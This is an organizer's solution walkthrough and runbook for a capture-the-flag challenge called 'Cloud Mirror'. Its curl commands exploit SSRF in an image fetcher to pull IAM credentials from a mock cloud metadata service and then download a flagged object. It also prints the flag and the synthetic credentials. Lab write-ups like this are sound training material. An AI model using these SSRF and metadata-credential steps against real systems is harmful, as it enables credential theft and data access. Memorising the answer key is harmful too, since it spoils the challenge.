# D29 — Cloud Mirror: Organizer Solution & Engineering Runbook

## 1. Challenge Overview
* **Challenge ID:** D29
* **Name:** Cloud Mirror
* **Difficulty:** Very Hard
* **Primary Concepts:** Server-Side Request Forgery (SSRF), Mock Metadata Service (IMDS), Temporary IAM Credentials, Isolated Mock Object Storage
* **External Interface:** TCP/80 (HTTP Web Application)
* **Author / Team:** Latveria Cybernetic Range Engineering Team

---

## 2. Architecture & Logical Chain

```text
Player (HTTP:80)
   |
   v
Image Fetcher Web App & API (/api/v1/fetch)
   |
   | SSRF (http://169.254.169.254/latest/meta-data/...)
   v
Mock Cloud Metadata Service (127.0.0.1:8181 - ClusterIP / Loopback)
   |
   | Recovers Temporary Credentials:
   | Token: latv_sess_tok_d29_cloud_mirror_88f9104c2b9a7d3e
   | Role:  LatveriaCloudMirrorRole
   v
Mock Object Store (127.0.0.1:9000 / http://storage.internal)
   |
   | Authenticated Request:
   | GET /api/v1/storage/classified-orbital-mirror/classified_mirror_master_key.dat
   | Header: Authorization: Bearer <Token>
   v
Flag Retrieval:
YUVA{cl0ud_m1rr0r_ssrf_m3t4d4t4_0bj_st0r3_7a9e2f}
```

---

## 3. Detailed Solve Walkthrough

### Step 1: Discover SSRF in Image Fetcher
The public application on TCP/80 exposes an image preview and fetching feature via `POST /api/v1/fetch` with payload:
```json
{
  "url": "http://storage.internal/api/v1/storage/public-assets/logo.png"
}
```
The server performs an HTTP request from the server side and returns status code, headers, and body content.

### Step 2: Query Mock Metadata Service
The participant leverages SSRF against standard cloud metadata endpoints:
```bash
curl -s -X POST http://<TARGET>/api/v1/fetch \
  -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/LatveriaCloudMirrorRole"}' | jq .
```

Response:
```json
{
  "status": "success",
  "requested_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/LatveriaCloudMirrorRole",
  "http_status": 200,
  "content_type": "application/json",
  "json_data": {
    "Code": "Success",
    "LastUpdated": "2026-09-26T06:00:00Z",
    "Type": "AWS-HMAC-LATVERIA-MOCK",
    "AccessKeyId": "LATV_MIRROR_TEMP_8a92f0c7e1",
    "SecretAccessKey": "latv_sec_mirror_7b3d91a45c08e2f11904a",
    "Token": "latv_sess_tok_d29_cloud_mirror_88f9104c2b9a7d3e",
    "Expiration": "2026-09-27T06:00:00Z",
    "StorageService": {
      "Endpoint": "http://127.0.0.1:9000/api/v1/storage",
      "InternalDNS": "http://storage.internal/api/v1/storage",
      "AuthHeader": "Authorization: Bearer <Token> (or X-Latveria-Token: <Token>)",
      "Description": "Latveria Orbital Defense Mock Object Storage"
    },
    "RoleArn": "arn:latveria:iam::992019482019:role/LatveriaCloudMirrorRole"
  }
}
```

### Step 3: Enumerate Storage Buckets
Using the recovered session token, query the mock storage service to list buckets:
```bash
curl -s -X POST http://<TARGET>/api/v1/fetch \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://storage.internal/api/v1/storage/buckets",
    "headers": {
      "Authorization": "Bearer latv_sess_tok_d29_cloud_mirror_88f9104c2b9a7d3e"
    }
  }' | jq .
```

Discovered Buckets:
* `public-assets`
* `archive-backups`
* `internal-telemetry`
* `classified-orbital-mirror`

### Step 4: List Objects in Classified Bucket
```bash
curl -s -X POST http://<TARGET>/api/v1/fetch \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://storage.internal/api/v1/storage/classified-orbital-mirror",
    "headers": {
      "Authorization": "Bearer latv_sess_tok_d29_cloud_mirror_88f9104c2b9a7d3e"
    }
  }' | jq .
```

Objects in `classified-orbital-mirror`:
* `mirror_cluster_topology.json`
* `orbital_override_instructions.pdf`
* `classified_mirror_master_key.dat`

### Step 5: Download Target Object & Retrieve Flag
```bash
curl -s -X POST http://<TARGET>/api/v1/fetch \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://storage.internal/api/v1/storage/classified-orbital-mirror/classified_mirror_master_key.dat",
    "headers": {
      "Authorization": "Bearer latv_sess_tok_d29_cloud_mirror_88f9104c2b9a7d3e"
    }
  }' | jq .
```

Response payload:
```json
{
  "classification": "TOP SECRET // LATVERIA ORBITAL DEFENSE",
  "asset_id": "ORBITAL-MIRROR-DEFENSE-KEY-01",
  "status": "VALID",
  "description": "Master Mirror Defense Emergency Recovery Data",
  "issued_to": "LatveriaCloudMirrorRole",
  "flag": "YUVA{cl0ud_m1rr0r_ssrf_m3t4d4t4_0bj_st0r3_7a9e2f}"
}
```

---

## 4. Reset Behavior
Destroying and recreating the container or pod generates a fresh state:
* Any temporary files or connection states are wiped.
* The flag is dynamically populated from `/opt/storage/flag.txt` or the instance `$FLAG` secret.
* The Mock Metadata and Object Storage services initialize freshly from seed configuration.

---

## 5. Security Boundaries & Isolation Validation
* **Mock Cloud Simulation**: No real cloud APIs, AWS credentials, GCP service accounts, or IAM roles exist. All metadata and tokens are challenge-local and synthetic.
* **Control-Plane Shielding**: SSRF engine blocks requests to Kubernetes API (`10.96.0.1:6443`, `kubernetes.default.svc`) and Kubelet (`10250`).
* **Object Storage Access Control**: Unauthenticated requests to private buckets yield HTTP 401 Unauthorized; invalid/decoy tokens yield HTTP 403 Forbidden.
* **Non-Root User Separation**:
  - Web App: `mirrorapp` (uid 1001)
  - Metadata Daemon: `metadata` (uid 1002)
  - Storage Daemon: `storage` (uid 1003)
  - Flag File: `/opt/storage/flag.txt` mode 0400 owned by `storage:storage`. Neither `mirrorapp` nor `metadata` can read it directly from the filesystem.

---

## 6. Resource Limits
* CPU: Requests 250m, Limits 1000m
* Memory: Requests 256Mi, Limits 768Mi (Masterbook limit: <= 768 MiB)
* SSRF Rate Limiting: Sliding window rate limiter throttles excessive requests (~10 req/sec) with HTTP 429 Retry-After.
